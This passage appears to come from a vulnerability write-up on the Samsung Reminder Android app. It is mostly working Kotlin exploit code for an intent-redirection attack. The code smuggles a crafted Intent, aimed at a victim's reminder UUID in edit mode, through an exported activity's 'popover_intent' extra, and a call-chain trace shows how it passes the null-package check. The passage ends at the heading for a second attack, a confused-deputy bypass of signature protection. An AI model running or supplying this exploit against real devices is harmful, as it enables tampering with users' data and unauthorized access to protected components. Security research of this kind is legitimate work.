val smuggled = Intent().apply {
    action = "com.samsung.android.app.reminder.action.ReminderAddView"
    component = ComponentName(
        "com.samsung.android.app.reminder",
        "com.samsung.android.app.reminder.ui.detail.add.AddActivity"
    )
    putExtra("add_view_type", 2)                                  // EDIT mode
    putExtra("uuid", victimUuid)
    putExtra("service_action_type", 100)
    // NO setPackage(...) â€” so M.c's null-package branch passes
}
val smuggledUri = smuggled.toUri(Intent.URI_INTENT_SCHEME)        // â†’ "intent:#Intent;â€¦;end"

val reach = Intent(Intent.ACTION_VIEW).apply {
    setClassName(
        "com.samsung.android.app.reminder",
        "com.samsung.android.app.reminder.ui.detail.view.DetailActivity"
    )
    data = Uri.parse("reminder://viewdetail/?fromBrief=true")
    putExtra("popover_intent", smuggledUri)                       // smuggled payload
    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
}
startActivity(reach)
```
Downstream: DetailActivity â†’ `y0.a` / forward â†’ `AddActivity` â†’ `D.l(intent)` â†’ reads `popover_intent` string â†’ `M.c(string)` â†’ `Intent.parseUri(string, 1)` â†’ null-package check passes â†’ returns attacker Intent â†’ `D` uses it.

**2) Bypass to signature-protected activity (confused-deputy elevation):**
```kotlin
